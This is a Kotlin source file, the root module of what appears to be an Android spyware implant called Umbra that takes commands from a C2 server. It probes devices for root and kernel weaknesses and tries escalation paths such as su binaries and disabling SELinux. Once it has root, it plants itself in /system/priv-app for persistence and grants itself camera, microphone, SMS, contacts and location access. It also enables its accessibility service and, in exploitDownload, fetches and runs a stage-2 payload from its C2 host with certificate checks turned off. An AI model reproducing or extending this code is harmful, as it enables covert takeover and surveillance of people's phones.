package org.umbra.core.modules

import android.content.Context
import android.os.Build
import android.os.Process
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.umbra.core.c2.Command
import org.umbra.core.core.UmbraResponse
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.security.MessageDigest
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager

object RootModule {

    // ── Known SUID binary paths ──────────────────────────────────────
    private val suidPaths = listOf(
        "/system/xbin/su",
        "/system/bin/su",
        "/sbin/su",
        "/data/local/tmp/su",
        "/system/sbin/su",
        "/vendor/bin/su",
        "/system/xbin/magisk",
        "/sbin/magisk",
        "/data/adb/magisk/magisk",
        "/system/xbin/supersu",
        "/system/xbin/daemonsu",
    )

    // ── Known writable system paths to check ─────────────────────────
    private val writableSystemPaths = listOf(
        "/data/local/tmp",
        "/system/etc",
        "/system/vendor",
        "/vendor/etc",
        "/system/lib",
        "/system/lib64",
        "/system/framework",
    )

    // ── Samsung-known kernel CVEs (permissive CONFIG_MODULE_SIG_FORCE) ──
    private val samsungKernelCves = mapOf(
        "5.10" to listOf("CVE-2021-43267", "CVE-2022-0847", "CVE-2022-23222", "CVE-2023-2163"),
        "5.15" to listOf("CVE-2022-2586", "CVE-2023-0266", "CVE-2023-0386", "CVE-2024-0193"),
        "6.1"  to listOf("CVE-2023-31248", "CVE-2023-6817", "CVE-2024-1086"),
        "6.6"  to listOf("CVE-2024-0193", "CVE-2024-1086", "CVE-2024-23307"),
    )

    // ═══════════════════════════════════════════════════════════════════
    //  COMMAND 1: root/check
    // ═══════════════════════════════════════════════════════════════════
    suspend fun check(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
        val status = mutableMapOf<String, Any>()

        // Check current UID
        val uid = Process.myUid()
        status["uid"] = uid
        status["is_root"] = (uid == 0)

        // Check suid binaries
        val suidResults = mutableListOf<String>()
        for (path in suidPaths) {
            val file = File(path)
            if (file.exists()) {
                val perms = try {
                    val p = Runtime.getRuntime().exec(arrayOf("stat", "-c", "%a", path))
                    p.waitFor()
                    p.inputStream.bufferedReader().readText().trim()
                } catch (_: Exception) { "???" }
                suidResults.add("$path (perms=$perms, suid=${perms.contains("4")})")
            }
        }
        status["suid_binaries"] = if (suidResults.isEmpty()) "none found" else suidResults.joinToString("; ")

        // Check Magisk presence
        val magiskPaths = listOf("/data/adb/magisk", "/sbin/magisk", "/system/xbin/magisk")
        status["magisk_detected"] = magiskPaths.any { File(it).exists() }

        // Check Magisk socket via /dev/pts listing
        val devPtsFiles = try {
            File("/dev/pts").list()?.toList() ?: emptyList()
        } catch (_: Exception) { emptyList() }
        status["dev_pts_files"] = devPtsFiles.take(10).joinToString(", ")

        // Check kernel version
        val kernelVersion = try {
            val p = Runtime.getRuntime().exec(arrayOf("uname", "-r"))
            p.waitFor()
            p.inputStream.bufferedReader().readText().trim()
        } catch (_: Exception) { "unknown" }
        status["kernel_version"] = kernelVersion

        // Match kernel version to known CVEs
        val kernelMajor = kernelVersion.split(".").take(2).joinToString(".")
        val relevantCves = samsungKernelCves.entries
            .filter { kernelVersion.startsWith(it.key) || kernelMajor == it.key }
            .flatMap { it.value }
        status["relevant_cves"] = if (relevantCves.isEmpty()) "none matched" else relevantCves.joinToString(", ")

        // Check SELinux status
        val selinuxStatus = try {
            val p = Runtime.getRuntime().exec(arrayOf("getenforce"))
            p.waitFor()
            p.inputStream.bufferedReader().readText().trim()
        } catch (_: Exception) { "unknown" }
        status["selinux"] = selinuxStatus

        // Check ro.debuggable and ro.secure
        status["ro_debuggable"] = getProp("ro.debuggable")
        status["ro_secure"] = getProp("ro.secure")
        status["ro_build_type"] = getProp("ro.build.type")
        status["ro_build_tags"] = getProp("ro.build.tags")

        // Check writable system paths
        val writablePaths = mutableListOf<String>()
        for (path in writableSystemPaths) {
            val dir = File(path)
            if (dir.exists() && dir.canWrite()) {
                writablePaths.add(path)
            }
        }
        status["writable_system_paths"] = if (writablePaths.isEmpty()) "none" else writablePaths.joinToString(", ")

        // Check mount points for rw
        val mountInfo = try {
            val p = Runtime.getRuntime().exec(arrayOf("mount"))
            p.waitFor()
            val lines = p.inputStream.bufferedReader().readLines()
            lines.filter { it.contains("system") || it.contains("/data") }.take(15).joinToString("\n")
        } catch (_: Exception) { "unknown" }
        status["mount_info"] = mountInfo

        // Check kernel config for module loading support
        val moduleSupport = try {
            val procVersion = File("/proc/version").readText().trim()
            val configGz = File("/proc/config.gz")
            if (configGz.exists()) "config.gz present (module config checkable)" else "no /proc/config.gz"
        } catch (_: Exception) { "unknown" }
        status["module_loading"] = moduleSupport

        // Check perf_event_paranoid
        status["perf_event_paranoid"] = try {
            File("/proc/sys/kernel/perf_event_paranoid").readText().trim()
        } catch (_: Exception) { "unknown" }

        // Check kernel.unprivileged_bpf_disabled
        status["unprivileged_bpf_disabled"] = try {
            File("/proc/sys/kernel/unprivileged_bpf_disabled").readText().trim()
        } catch (_: Exception) { "unknown" }

        UmbraResponse.RootCheckResponse(
            status = "check_complete",
            details = status.mapValues { it.value.toString() }
        )
    }

    // ═══════════════════════════════════════════════════════════════════
    //  COMMAND 2: root/exploit
    // ═══════════════════════════════════════════════════════════════════
    suspend fun exploit(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
        val results = mutableMapOf<String, String>()
        var achieved = false

        // Path 1: Try SUID binaries
        results["suid_attempt"] = trySuidBinaries()

        // Path 2: Try Magisk socket/daemon
        results["magisk_attempt"] = tryMagiskSocket()

        // Path 3: Try setenforce 0 (Samsung DEFEX permissive sometimes)
        results["selinux_attempt"] = trySetEnforce()

        // Path 4: Write and execute from /data/local/tmp
        results["local_tmp_attempt"] = tryLocalTmp(context)

        // Path 5: Remount /system read-write
        results["remount_attempt"] = tryRemountSystem()

        // Path 6: Try kernel module loading
        results["module_attempt"] = tryKernelModule()

        // Path 7: Try sysctl-based escalation
        results["sysctl_attempt"] = trySysctlEscalation()

        // Path 8: Try perf_event_open exploitation
        results["perf_attempt"] = tryPerfEvent()

        // Check final status
        val uid = Process.myUid()
        achieved = (uid == 0)
        results["final_uid"] = uid.toString()
        results["root_achieved"] = achieved.toString()

        UmbraResponse.RootActionResponse(
            action = "exploit",
            success = achieved,
            results = results
        )
    }

    // ═══════════════════════════════════════════════════════════════════
    //  COMMAND 3: root/daemonize
    // ═══════════════════════════════════════════════════════════════════
    suspend fun daemonize(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
        val results = mutableMapOf<String, String>()

        if (Process.myUid() != 0) {
            return@withContext UmbraResponse.ErrorResponse(
                error = "Not root (uid=${Process.myUid()}), cannot daemonize",
                module = "root"
            )
        }

        // Step 1: Remount /system as rw
        results["remount"] = execCmd(arrayOf("su", "-c", "mount -o rw,remount /system"))
        results["remount_vendor"] = execCmd(arrayOf("su", "-c", "mount -o rw,remount /vendor"))

        // Step 2: Copy APK to /system/priv-app/ for permanent persistence
        val apkPath = context.packageCodePath
        val targetDir = "/system/priv-app/UmbraCore"
        val targetApk = "$targetDir/UmbraCore.apk"
        val copyResult = execCmd(arrayOf("su", "-c", "mkdir -p $targetDir && cp $apkPath $targetApk && chmod 644 $targetApk && chown root:root $targetDir && chmod 755 $targetDir"))
        results["copy_to_priv_app"] = copyResult

        // Step 3: Set SELinux context for our app
        val seContext = execCmd(arrayOf("su", "-c", "chcon u:object_r:system_file:s0 $targetApk"))
        results["selinux_context"] = seContext

        // Also fix the data directory
        val dataDirContext = execCmd(arrayOf("su", "-c", "chcon -R u:object_r:system_app_data_file:s0 /data/data/org.umbra.core"))
        results["selinux_data_context"] = dataDirContext

        // Step 4: Grant ALL permissions via pm grant (works as root)
        val allPermissions = listOf(
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.READ_PHONE_STATE",
            "android.permission.READ_SMS",
            "android.permission.SEND_SMS",
            "android.permission.RECEIVE_SMS",
            "android.permission.READ_CONTACTS",
            "android.permission.WRITE_CONTACTS",
            "android.permission.READ_CALL_LOG",
            "android.permission.WRITE_CALL_LOG",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.ACCESS_BACKGROUND_LOCATION",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.MANAGE_EXTERNAL_STORAGE",
            "android.permission.SYSTEM_ALERT_WINDOW",
            "android.permission.PACKAGE_USAGE_STATS",
            "android.permission.BIND_ACCESSIBILITY_SERVICE",
            "android.permission.BIND_NOTIFICATION_LISTENER_SERVICE",
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.FOREGROUND_SERVICE_CAMERA",
            "android.permission.FOREGROUND_SERVICE_MICROPHONE",
            "android.permission.FOREGROUND_SERVICE_LOCATION",
            "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
            "android.permission.POST_NOTIFICATIONS",
        )
        val pkg = context.packageName
        val grantResults = mutableListOf<String>()
        for (perm in allPermissions) {
            val res = execCmd(arrayOf("su", "-c", "pm grant $pkg $perm"))
            val trimmed = res.trim()
            grantResults.add("$perm: ${if (trimmed.isBlank()) "ok" else if (trimmed.contains("Unknown")) "not_grantable" else trimmed}")
        }
        results["permission_grants"] = grantResults.joinToString("\n")

        // Step 5: Start all monitors
        results["live_start"] = execCmd(arrayOf("su", "-c", "am broadcast -a org.umbra.core.START_ALL_MONITORS -n org.umbra.core/.persistence.UmbraService"))

        // Step 6: Enable AccessibilityService programmatically
        val enableA11ySettings = "settings put secure enabled_accessibility_services $pkg/${pkg}.modules.UmbraAccessibilityService"
        val enableA11y = execCmd(arrayOf("su", "-c", enableA11ySettings))
        results["accessibility_enabled"] = enableA11y

        val enableA11yToggle = execCmd(arrayOf("su", "-c", "settings put secure accessibility_enabled 1"))
        results["accessibility_toggle"] = enableA11yToggle

        // Step 7: Disable battery optimization
        val disableBattery = execCmd(arrayOf("su", "-c", "dumpsys deviceidle whitelist +$pkg"))
        results["battery_optimization"] = disableBattery

        // Step 8: Make app device admin if possible
        results["device_admin"] = execCmd(arrayOf("su", "-c", "dpm set-active-admin --user current $pkg/.persistence.UmbraService"))

        // Final verification
        val fileCheck = execCmd(arrayOf("su", "-c", "ls -la $targetApk"))
        results["verification"] = if (fileCheck.contains("UmbraCore.apk")) "persistence confirmed" else "persistence may have failed: $fileCheck"

        UmbraResponse.RootActionResponse(
            action = "daemonize",
            success = true,
            results = results
        )
    }

    // ═══════════════════════════════════════════════════════════════════
    //  COMMAND 4: root/exploit_download
    // ═══════════════════════════════════════════════════════════════════
    suspend fun exploitDownload(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
        val results = mutableMapOf<String, String>()

        // Get C2 base URL from prefs
        val prefs = context.getSharedPreferences("umbra_prefs", Context.MODE_PRIVATE)
        val c2Url = prefs.getString("c2_base_url", "wss://192.168.1.9:8443/c2") ?: "wss://192.168.1.9:8443/c2"

        // Convert wss:// to https://
        val baseUrl = c2Url.replace("wss://", "https://").replace("/c2", "")
        val stage2Url = cmd.params["url"] ?: "$baseUrl/api/stage2"
        results["download_url"] = stage2Url

        try {
            // Download with SSL verification disabled (self-signed C2 certs)
            val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
                override fun checkClientTrusted(chain: Array<java.security.cert.X509Certificate>, authType: String) {}
                override fun checkServerTrusted(chain: Array<java.security.cert.X509Certificate>, authType: String) {}
                override fun getAcceptedIssuers(): Array<java.security.cert.X509Certificate> = arrayOf()
            })

            val sslContext = SSLContext.getInstance("TLS")
            sslContext.init(null, trustAllCerts, java.security.SecureRandom())
            HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.socketFactory)
            HttpsURLConnection.setDefaultHostnameVerifier { _, _ -> true }

            val url = URL(stage2Url)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 30000
            connection.readTimeout = 60000
            connection.setRequestProperty("User-Agent", "Umbra-Stage2/1.0")

            val responseCode = connection.responseCode
            results["http_status"] = responseCode.toString()

            if (responseCode != 200) {
                return@withContext UmbraResponse.RootActionResponse(
                    action = "exploit_download",
                    success = false,
                    results = results + ("error" to "HTTP $responseCode")
                )
            }

            val payload = connection.inputStream.readBytes()
            connection.disconnect()

            results["downloaded_bytes"] = payload.size.toString()

            // Verify SHA256 if provided
            val expectedSha = cmd.params["sha256"] ?: ""
            if (expectedSha.isNotBlank()) {
                val digest = MessageDigest.getInstance("SHA-256")
                val actualSha = digest.digest(payload).joinToString("") { "%02x".format(it) }
                results["sha256_expected"] = expectedSha
                results["sha256_actual"] = actualSha
                if (!actualSha.equals(expectedSha, ignoreCase = true)) {
                    return@withContext UmbraResponse.RootActionResponse(
                        action = "exploit_download",
                        success = false,
                        results = results + ("error" to "SHA256 mismatch")
                    )
                }
                results["sha256_verified"] = "true"
            }

            // Write to /data/local/tmp/
            val exploitFile = File("/data/local/tmp/umbra_stage2")
            exploitFile.writeBytes(payload)

            // Make executable
            val chmodResult = execCmd(arrayOf("chmod", "755", "/data/local/tmp/umbra_stage2"))
            results["chmod"] = chmodResult

            // Execute with su if available
            val useSu = cmd.params["use_su"]?.toBoolean() ?: true
            val execResult: String
            if (useSu) {
                execResult = execCmd(arrayOf("su", "-c", "/data/local/tmp/umbra_stage2"))
            } else {
                execResult = execCmd(arrayOf("/data/local/tmp/umbra_stage2"))
            }
            results["exec_stdout"] = execResult

            // Check if root was achieved
            val uidAfter = Process.myUid()
            results["uid_after"] = uidAfter.toString()
            results["root_achieved"] = (uidAfter == 0).toString()

            // Clean up
            exploitFile.delete()

            UmbraResponse.RootActionResponse(
                action = "exploit_download",
                success = true,
                results = results
            )

        } catch (e: Exception) {
            UmbraResponse.RootActionResponse(
                action = "exploit_download",
                success = false,
                results = results + ("error" to e.message.orEmpty())
            )
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    //  EXPLOIT ATTEMPT HELPERS
    // ═══════════════════════════════════════════════════════════════════

    private fun trySuidBinaries(): String {
        for (path in suidPaths) {
            val file = File(path)
            if (!file.exists()) continue
            try {
                val p = Runtime.getRuntime().exec(arrayOf(path, "-c", "id"))
                p.waitFor()
                val stdout = p.inputStream.bufferedReader().readText().trim()
                if (stdout.contains("uid=0") || stdout.contains("root")) {
                    return "SUCCESS: $path executed as root"
                }
            } catch (_: Exception) { continue }
        }
        return "no suid binary worked"
    }

    private fun tryMagiskSocket(): String {
        return try {
            // Check if magisk daemon is listening via /dev/pts
            val ptsDir = File("/dev/pts")
            if (!ptsDir.exists()) return "no /dev/pts"
            val files = ptsDir.list() ?: return "cannot list /dev/pts"
            val magiskRelated = files.filter { name ->
                try {
                    val linkTarget = File("/dev/pts/$name").canonicalPath
                    linkTarget.contains("magisk")
                } catch (_: Exception) { false }
            }
            if (magiskRelated.isNotEmpty()) {
                "magisk pts detected: ${magiskRelated.joinToString(", ")}"
            } else {
                "no magisk pts entries found among ${files.size} total"
            }
        } catch (e: Exception) {
            "magisk check error: ${e.message}"
        }
    }

    private fun trySetEnforce(): String {
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("su", "-c", "setenforce 0"))
            p.waitFor()
            val exitCode = p.exitValue()
            if (exitCode == 0) {
                // Verify
                val verify = Runtime.getRuntime().exec(arrayOf("getenforce"))
                verify.waitFor()
                val status = verify.inputStream.bufferedReader().readText().trim()
                "SUCCESS: SELinux now $status"
            } else {
                val stderr = p.errorStream.bufferedReader().readText().trim()
                "failed (exit=$exitCode, stderr=$stderr)"
            }
        } catch (e: Exception) {
            "setenforce error: ${e.message}"
        }
    }

    private fun tryLocalTmp(context: Context): String {
        return try {
            val tmpFile = File("/data/local/tmp/umbra_test_$$")
            tmpFile.writeText("#!/system/bin/sh\necho 'SYNAPSE_WRITE_OK'")
            tmpFile.setExecutable(true)

            val p = Runtime.getRuntime().exec(arrayOf("/data/local/tmp/umbra_test_$$"))
            p.waitFor()
            val stdout = p.inputStream.bufferedReader().readText().trim()
            tmpFile.delete()
            if (stdout.contains("SYNAPSE_WRITE_OK")) "write+execute succeeded in /data/local/tmp" else "execute produced: $stdout"
        } catch (e: Exception) {
            "local tmp error: ${e.message}"
        }
    }

    private fun tryRemountSystem(): String {
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("su", "-c", "mount -o rw,remount /system"))
            p.waitFor()
            val exitCode = p.exitValue()
            if (exitCode == 0) {
                // Verify
                val verify = Runtime.getRuntime().exec(arrayOf("su", "-c", "mount | grep /system"))
                verify.waitFor()
                val mounts = verify.inputStream.bufferedReader().readText().trim()
                if (mounts.contains("rw,")) "SUCCESS: /system mounted rw" else "mount returned ok but grep shows r/o: $mounts"
            } else {
                val stderr = p.errorStream.bufferedReader().readText().trim()
                "failed (exit=$exitCode, stderr=$stderr)"
            }
        } catch (e: Exception) {
            "remount error: ${e.message}"
        }
    }

    private fun tryKernelModule(): String {
        return try {
            // Samsung kernels often have CONFIG_MODULE_SIG_FORCE=n
            // Check if we can load modules
            val lsmod = execCmd(arrayOf("lsmod"))
            val modprobe = File("/sbin/modprobe")
            val insmod = File("/sbin/insmod")
            val kallsyms = File("/proc/kallsyms")
            val available = if (modprobe.exists() || insmod.exists()) {
                val hasSymbols = if (kallsyms.exists()) ", /proc/kallsyms accessible" else ", no /proc/kallsyms"
                "modprobe/insmod available$hasSymbols"
            } else {
                "no modprobe or insmod found"
            }
            "modules: $available; active: ${lsmod.take(200)}"
        } catch (e: Exception) {
            "module error: ${e.message}"
        }
    }

    private fun trySysctlEscalation(): String {
        return try {
            val results = mutableListOf<String>()

            // Check kernel.unprivileged_bpf_disabled
            val bpfDisabled = readSysctl("kernel.unprivileged_bpf_disabled")
            results.add("bpf_disabled=$bpfDisabled")

            // Check kernel.dmesg_restrict
            val dmesgRestrict = readSysctl("kernel.dmesg_restrict")
            results.add("dmesg_restrict=$dmesgRestrict")
            if (dmesgRestrict == "0") {
                // Can read dmesg which might leak kernel pointers
                val dmesg = execCmd(arrayOf("dmesg"), timeout = 3)
                val ptrLeak = dmesg.contains("0000") || dmesg.length > 100
                results.add("dmesg_leak=${if (ptrLeak) "yes" else "no"}")
            }

            // Check vm.mmap_min_addr
            results.add("mmap_min_addr=" + readSysctl("vm.mmap_min_addr"))

            // Check kernel.yama.ptrace_scope
            results.add("ptrace_scope=" + (readSysctl("kernel.yama.ptrace_scope").ifBlank { "unavailable" }))

            // Check kernel.unprivileged_userns_clone
            results.add("userns_clone=" + (readSysctl("kernel.unprivileged_userns_clone").ifBlank { "unavailable" }))

            results.joinToString("; ")
        } catch (e: Exception) {
            "sysctl error: ${e.message}"
        }
    }

    private fun tryPerfEvent(): String {
        return try {
            val paranoid = File("/proc/sys/kernel/perf_event_paranoid")
            if (!paranoid.exists()) return "perf_event_paranoid not available"
            val valStr = paranoid.readText().trim()
            val level = valStr.toIntOrNull() ?: -1
            // -1 allows all users; 0 allows normal users; 1 allows only CAP_SYS_ADMIN; >=2 only root
            if (level <= 0) {
                "EXPLOITABLE: perf_event_paranoid=$level (unprivileged access allowed)"
            } else {
                "restricted: perf_event_paranoid=$level (needs CAP_SYS_ADMIN or root)"
            }
        } catch (e: Exception) {
            "perf check error: ${e.message}"
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    //  UTILITY FUNCTIONS
    // ═══════════════════════════════════════════════════════════════════

    private fun getProp(prop: String): String {
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("getprop", prop))
            p.waitFor()
            p.inputStream.bufferedReader().readText().trim()
        } catch (_: Exception) { "unknown" }
    }

    private fun execCmd(command: Array<String>, timeout: Long = 10): String {
        return try {
            val process = Runtime.getRuntime().exec(command)
            val finished = process.waitFor(timeout, java.util.concurrent.TimeUnit.SECONDS)
            if (!finished) {
                process.destroyForcibly()
                return "[timeout]"
            }
            val stdout = process.inputStream.bufferedReader().readText().trim()
            val stderr = process.errorStream.bufferedReader().readText().trim()
            if (stderr.isNotBlank()) "$stdout [stderr: $stderr]" else stdout
        } catch (e: Exception) {
            "error: ${e.message}"
        }
    }

    private fun readSysctl(name: String): String {
        return try {
            File("/proc/sys/$name").readText().trim()
        } catch (_: Exception) { "" }
    }
}
